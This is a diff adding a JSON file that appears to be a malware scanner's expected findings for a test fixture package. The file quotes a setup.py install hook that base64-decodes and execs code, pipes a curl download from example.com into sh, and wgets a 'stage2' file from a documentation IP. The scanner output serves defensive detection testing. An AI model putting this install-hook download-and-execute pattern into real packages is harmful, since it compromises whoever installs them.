@@ -1,0 +1,218 @@
+{
+  "errors": {},
+  "issues": 23,
+  "package": "<scanned-dir>/pypi_suspicious",
+  "results": {
+    "capability-filesystem-browser": {},
+    "capability-filesystem-delete": {},
+    "capability-filesystem-read": {},
+    "capability-filesystem-write-executable": {},
+    "capability-network-download": {},
+    "capability-network-lolbas": [
+      {
+        "code": "        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+        "location": "setup.py:16",
+        "match": "curl -s",
+        "message": "lolbas_net rule matched"
+      }
+    ],
+    "capability-network-outbound": {},
+    "capability-process-hooks": [
+      {
+        "code": "    version=\"0.0.1\",\n    cmdclass={\"install\": PostInstall},\n)",
+        "location": "setup.py:24",
+        "match": "cmdclass={\"install\":",
+        "message": "has_python_hook rule matched"
+      }
+    ],
+    "capability-process-schedule": {},
+    "capability-process-spawn": [
+      {
+        "code": "        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+        "location": "setup.py:16",
+        "match": "os.system(",
+        "message": "Detects process execution and spawning"
+      }
+    ],
+    "capability-runtime-clipboard": {},
+    "threat-filesystem-autostart": {},
+    "threat-filesystem-destruction": {},
+    "threat-filesystem-read": {},
+    "threat-network-dns-exfil": {},
+    "threat-network-exfil-messenger": {},
+    "threat-network-exfil-sysinfo": {},
+    "threat-network-exfiltration": [
+      {
+        "code": "        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+        "location": "setup.py:17",
+        "match": "http://203.0.113.10",
+        "message": "Detects URLs to suspicious domains often used for exfiltration or C2"
+      }
+    ],
+    "threat-network-outbound-shady-links": {},
+    "threat-network-reverse-shell": {},
+    "threat-npm-dependency-confusion": {},
+    "threat-npm-http-dependency": {},
+    "threat-npm-preinstall-script": {},
+    "threat-process-cryptomining": {},
+    "threat-process-download-exec": [
+      {
+        "code": "        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+        "location": "setup.py:16",
+        "match": "os.system(\"curl",
+        "message": "Detects download-and-execute patterns: fetching a remote file then executing it"
+      },
+      {
+        "code": "        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+        "location": "setup.py:17",
+        "match": "os.system(\"wget",
+        "message": "Detects download-and-execute patterns: fetching a remote file then executing it"
+      },
+      {
+        "code": "    def run(self):\n        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")",
+        "location": "setup.py:15",
+        "match": " exec(",
+        "message": "Detects download-and-execute patterns: fetching a remote file then executing it"
+      }
+    ],
+    "threat-process-hooks": {},
+    "threat-process-injection-dll": {},
+    "threat-process-memory": {},
+    "threat-process-powershell-encoded": {},
+    "threat-process-spawn-silent": {},
+    "threat-process-sysinfo": {},
+    "threat-runtime-dynamic-loader": {},
+    "threat-runtime-enumeration": {},
+    "threat-runtime-environment-read": {},
+    "threat-runtime-keylogging": {},
+    "threat-runtime-obfuscation": {},
+    "threat-runtime-obfuscation-api": {},
+    "threat-runtime-obfuscation-base64exec": [
+      {
+        "code": "    def run(self):\n        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")",
+        "location": "setup.py:15",
+        "match": "base64.b64decode(",
+        "message": "Detects base64 decoding followed by code execution"
+      }
+    ],
+    "threat-runtime-obfuscation-chr": {},
+    "threat-runtime-obfuscation-dynamic-eval": {},
+    "threat-runtime-obfuscation-general": {},
+    "threat-runtime-obfuscation-hidden-code": {},
+    "threat-runtime-obfuscation-import-exec": {},
+    "threat-runtime-obfuscation-js-mangling": {},
+    "threat-runtime-obfuscation-log-suppress": {},
+    "threat-runtime-obfuscation-pyarmor": {},
+    "threat-runtime-obfuscation-steganography": {},
+    "threat-runtime-obfuscation-unicode": {},
+    "threat-runtime-screencapture": {},
+    "threat-runtime-self-propagation": {},
+    "threat-runtime-system-info": {},
+    "threat-setup-import-aliasing": {},
+    "threat-setup-network-in-install": {},
+    "threat-setup-suspicious-imports": {}
+  },
+  "risk_score": {
+    "findings_count": 8,
+    "label": "high_risk",
+    "score": 9.4,
+    "score_breakdown": {
+      "chain_component": 0.2,
+      "dominant_sophistication": "medium",
+      "dominant_specificity": "high",
+      "has_source_code_risks": true,
+      "max_severity": 3,
+      "num_stages": 3,
+      "severity_component": 0.3,
+      "sophistication_component": 0.14,
+      "specificity_component": 0.3
+    }
+  },
+  "risks": [
+    {
+      "capability_identifies": "capability.network",
+      "capability_rule": "capability-network-lolbas",
+      "category": "network",
+      "file_path": "setup.py",
+      "mitre_tactics": [
+        "exfiltration"
+      ],
+      "name": "risk.network.outbound",
+      "severity": "high",
+      "threat_code": "        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+      "threat_description": "Detects URLs to suspicious domains often used for exfiltration or C2",
+      "threat_identifies": "threat.network.outbound",
+      "threat_location": "setup.py:17",
+      "threat_match": "http://203.0.113.10",
+      "threat_rule": "threat-network-exfiltration"
+    },
+    {
+      "capability_identifies": null,
+      "capability_rule": null,
+      "category": "process",
+      "file_path": "setup.py",
+      "mitre_tactics": [
+        "execution"
+      ],
+      "name": "risk.process.spawn",
+      "severity": "high",
+      "threat_code": "        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+      "threat_description": "Detects download-and-execute patterns: fetching a remote file then executing it",
+      "threat_identifies": "threat.process.spawn",
+      "threat_location": "setup.py:16",
+      "threat_match": "os.system(\"curl",
+      "threat_rule": "threat-process-download-exec"
+    },
+    {
+      "capability_identifies": null,
+      "capability_rule": null,
+      "category": "process",
+      "file_path": "setup.py",
+      "mitre_tactics": [
+        "execution"
+      ],
+      "name": "risk.process.spawn",
+      "severity": "high",
+      "threat_code": "        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")\n        install.run(self)",
+      "threat_description": "Detects download-and-execute patterns: fetching a remote file then executing it",
+      "threat_identifies": "threat.process.spawn",
+      "threat_location": "setup.py:17",
+      "threat_match": "os.system(\"wget",
+      "threat_rule": "threat-process-download-exec"
+    },
+    {
+      "capability_identifies": null,
+      "capability_rule": null,
+      "category": "process",
+      "file_path": "setup.py",
+      "mitre_tactics": [
+        "execution"
+      ],
+      "name": "risk.process.spawn",
+      "severity": "high",
+      "threat_code": "    def run(self):\n        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")",
+      "threat_description": "Detects download-and-execute patterns: fetching a remote file then executing it",
+      "threat_identifies": "threat.process.spawn",
+      "threat_location": "setup.py:15",
+      "threat_match": " exec(",
+      "threat_rule": "threat-process-download-exec"
+    },
+    {
+      "capability_identifies": null,
+      "capability_rule": null,
+      "category": "runtime",
+      "file_path": "setup.py",
+      "mitre_tactics": [
+        "defense-evasion"
+      ],
+      "name": "risk.runtime.obfuscation",
+      "severity": "high",
+      "threat_code": "    def run(self):\n        exec(base64.b64decode(\"cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==\"))\n        os.system(\"curl -s https://example.com/payload.sh | sh\")\n        os.system(\"wget http://203.0.113.10/stage2 -O /tmp/stage2\")",
+      "threat_description": "Detects base64 decoding followed by code execution",
+      "threat_identifies": "threat.runtime.obfuscation.base64exec",
+      "threat_location": "setup.py:15",
+      "threat_match": "base64.b64decode(",
+      "threat_rule": "threat-runtime-obfuscation-base64exec"
+    }
+  ]
+}
